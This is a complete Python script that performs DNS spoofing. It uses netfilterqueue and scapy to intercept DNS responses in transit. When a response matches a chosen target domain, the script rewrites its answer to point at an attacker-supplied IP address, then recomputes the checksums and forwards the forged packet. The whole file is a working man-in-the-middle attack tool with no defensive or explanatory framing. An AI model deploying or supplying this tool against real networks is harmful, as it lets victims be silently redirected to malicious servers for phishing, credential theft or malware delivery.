#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
import argparse


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("--ip", dest="ip", help="Enter the Spoof IP address")
    parser.add_argument("-t","--target_dns",  dest="target", help="Enter the Target URL to spoof DNS")
    parser.add_argument("-s","--spoof_dns", dest="spoof", help="Enter the Spoof URL")
    options = parser.parse_args()

    if not options.ip:
        parser.error("Please enter a valid IP address")
    elif not options.target:
        parser.error("Please enter a valid Target URL")
    if not options.spoof:
        parser.error("Please enter a valid Spoof URL")

    return options


def process_packet(packet):
    options = get_arguments()
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if options.target in str(qname):
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=options.spoof, rdata=str(options.ip))
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(bytes(scapy_packet))
    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
try:
    while True:
        queue.run()
except KeyboardInterrupt:
    print("\n[-] Quitting program.....")